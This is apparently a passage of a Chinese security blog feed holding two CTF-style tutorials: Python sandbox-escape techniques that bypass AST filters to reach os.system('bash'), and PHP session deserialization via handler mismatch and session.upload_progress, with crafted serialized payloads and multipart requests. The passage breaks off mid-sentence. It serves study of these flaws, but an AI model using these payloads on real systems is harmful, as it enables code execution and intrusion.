<h5 id="绕过-ast-Assign-赋值变量"><a href="#绕过-ast-Assign-赋值变量" class="headerlink" title="绕过 ast.Assign 赋值变量"></a>绕过 ast.Assign 赋值变量</h5><p>ast.Assign 无法使用时，我们无法直接使用 &#x3D; 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[system:=<span class="number">111</span>,bash:=<span class="number">222</span>]</span><br><span class="line">:=  --》海象运算法，赋值</span><br></pre></td></tr></table></figure>

<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Module(</span><br><span class="line">    body=[</span><br><span class="line">        Expr(</span><br><span class="line">            value=<span class="type">List</span>(</span><br><span class="line">                elts=[</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;system&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">111</span>)),</span><br><span class="line">                    NamedExpr(</span><br><span class="line">                        target=Name(<span class="built_in">id</span>=<span class="string">&#x27;bash&#x27;</span>, ctx=Store()),</span><br><span class="line">                        value=Constant(value=<span class="number">222</span>))],</span><br><span class="line">                ctx=Load()))],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-Constant-获取数字、字符串"><a href="#绕过-ast-Constant-获取数字、字符串" class="headerlink" title="绕过 ast.Constant 获取数字、字符串"></a>绕过 ast.Constant 获取数字、字符串</h5><p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span> : <span class="built_in">str</span>()</span><br><span class="line"><span class="number">0</span>  : <span class="built_in">len</span>([])</span><br><span class="line"><span class="string">&quot;0&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([]))</span><br><span class="line"><span class="string">&quot;1&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>()])) 或 <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>]))</span><br><span class="line"><span class="string">&quot;2&quot;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">str</span>(),<span class="built_in">str</span>()])) 或 <span class="built_in">str</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">max</span>]))</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>: <span class="built_in">chr</span>(<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>])*<span class="built_in">len</span>([<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>,<span class="built_in">min</span>]))</span><br></pre></td></tr></table></figure>

<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p>
<p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串,上面过滤引号那里有说。</p>
<p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>那么就可以通过下面的方式获取到这几个字符串：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(system=[]))[<span class="number">0</span>]            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[]))[<span class="number">0</span>]       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[]))[<span class="number">0</span>]              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-Subscript-获取列表-字典元素"><a href="#绕过-ast-Subscript-获取列表-字典元素" class="headerlink" title="绕过 ast.Subscript 获取列表&#x2F;字典元素"></a>绕过 ast.Subscript 获取列表&#x2F;字典元素</h5><p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(system=[])))            <span class="comment"># system</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))       <span class="comment"># _wrap_close</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(bash=[])))              <span class="comment"># bash</span></span><br></pre></td></tr></table></figure>

<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match&#x2F;case 来获取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">globals</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">object</span>(get=get_func):</span><br><span class="line">        get_func(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="绕过-ast-For-遍历列表"><a href="#绕过-ast-For-遍历列表" class="headerlink" title="绕过 ast.For 遍历列表"></a>绕过 ast.For 遍历列表</h5><p>在构造最终 payload 中，我们还需要在 <code>__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;bash&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter_func</span>(<span class="params">subclazzes_item</span>):</span><br><span class="line">    [ _wrap_close:=<span class="built_in">min</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(_wrap_close=[])))]</span><br><span class="line">    <span class="keyword">match</span> subclazzes_item:</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">object</span>(_＿name_＿=name):</span><br><span class="line">            <span class="keyword">if</span> name==_wrap_close:</span><br><span class="line">                <span class="keyword">return</span> subclazzes_item</span><br><span class="line">[</span><br><span class="line">    subclazzes_item:=<span class="built_in">min</span>(<span class="built_in">filter</span>(filter_func,subclazzes()))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>fitler 中使用 match&#x2F;case 和 if 来进行过滤。</p>
<p>除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
<p>参考文章：<br><code>https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html</code></p>
<p><code>https://xz.aliyun.com/t/52?time__1311=n4RxyDn7DQ0QUx0y34%2B2Wx9D0Ok%2FdDRmrYD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-5</code></p>
<p><code>https://xz.aliyun.com/t/2308?time__1311=n4%2BxnieDqWqYq7KYBKDsf3Of1GCAD9D4GqxAD&amp;alichlgref=https%3A%2F%2Fucasers.cn%2F</code></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>python沙箱逃逸</category>
      </categories>
  </entry>
  <entry>
    <title>session反序列化学习</title>
    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>好用，爱用，多用</p>
<span id="more"></span>

<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
<p><strong>PHP session：</strong></p>
<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>



<ul>
<li>session.save_handler&#x3D;””</li>
</ul>
<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
<ul>
<li><strong>session.serialize_handler</strong></li>
</ul>
<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
<p>并且文件的内容始终是session值的序列化之后的内容。</p>
<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>

<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
<ul>
<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
</li>
<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
</li>
</ul>
<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考文章1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
<p>测试一下，demo如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
<p>demo改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
<p>两张图片可以对比一下</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
<p>flag.php：</p>
<p>这个页面用于接受session的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.php：</p>
<p>这个页面用于测试反序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先访问1.php，输出</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
<p>在电脑上看一看此时session的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到成功写入，这是再访问以下1.php</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
<p>成功反序。</p>
<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
<ul>
<li>两个文件session引擎配置不同</li>
<li>其中一个session可控</li>
<li>两个文件同域</li>
</ul>
<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
<p>条件：</p>
<ol>
<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
</ol>
<p>这两个都是可在查的</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
<p><strong>对session上传进度说明一下：</strong></p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>

<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
